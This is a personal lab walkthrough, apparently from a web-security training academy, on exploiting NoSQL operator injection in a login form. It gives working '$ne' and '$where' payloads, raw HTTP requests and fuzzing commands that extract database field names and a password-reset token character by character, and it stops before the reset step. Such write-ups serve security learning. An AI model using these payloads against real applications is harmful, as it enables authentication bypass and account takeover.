# Exploiting NoSQL operator injection to extract unknown fields
First, I tried to find NoSQL injection on the page. I did so by injecting the body when trying to login to this:
```json
{
    "username": {
        "$eq": "carlos"
    },
    "password": {
        "$ne": "invalid"
    }
}
```
This got the server to respond with `Account locked: please reset your password`. I then enumeated some more to find that we could use `$where` operator like this in the application:
```json
    "username": {
        "$eq": "carlos"
    },
    "password": {
        "$ne": "invalid"
    },
    "$where": "1"
```
I then wanted to see what fields the database had. Since I don't have Burp Professional, I made a tool which could help me achieve this. The tool can be [found here](https://github.com/theballmarcus/theballmarcus-payloads/blob/main/tools/burp_to_wfuzz).
I made a request file like this:
```
POST /login HTTP/2
Host: 0a2900b204dd058d823f028c003700ba.web-security-academy.net
Cookie: session=OBZlVeVvDzK4TZEgZlXHAbFUsH5BAznS
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2900b204dd058d823f028c003700ba.web-security-academy.net/login
Content-Type: application/json
Content-Length: 102
Origin: https://0a2900b204dd058d823f028c003700ba.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"carlos","password":{
"$ne":"invalid"},
"$where": "Object.keys(this)[FIZZR].match('^FUZZ.*')"
}
```
I then reset carlos password on the page and then I ran my tool: `burp_to_wfuzz run r.txt --https --guess-word`
This got me 
```
Guessed results:
0: _id
1: username
2: password
3: email
4: changePwd
```
Next up, I wanted to see what was inside his changePwd field. I therefore made another request file:
```
POST /login HTTP/2
Host: 0a2900b204dd058d823f028c003700ba.web-security-academy.net
Cookie: session=OBZlVeVvDzK4TZEgZlXHAbFUsH5BAznS
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2900b204dd058d823f028c003700ba.web-security-academy.net/login
Content-Type: application/json
Content-Length: 102
Origin: https://0a2900b204dd058d823f028c003700ba.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"carlos","password":{
"$ne":"invalid"},
"$where": "this.changePwd.match('^FUZZ')"
}
```
I ran my tool: `burp_to_wfuzz run r2.txt --https --guess-word`
And it returned `Found 'd' -> ceb3f80200f1331d`
Then I needed to find the reset password url.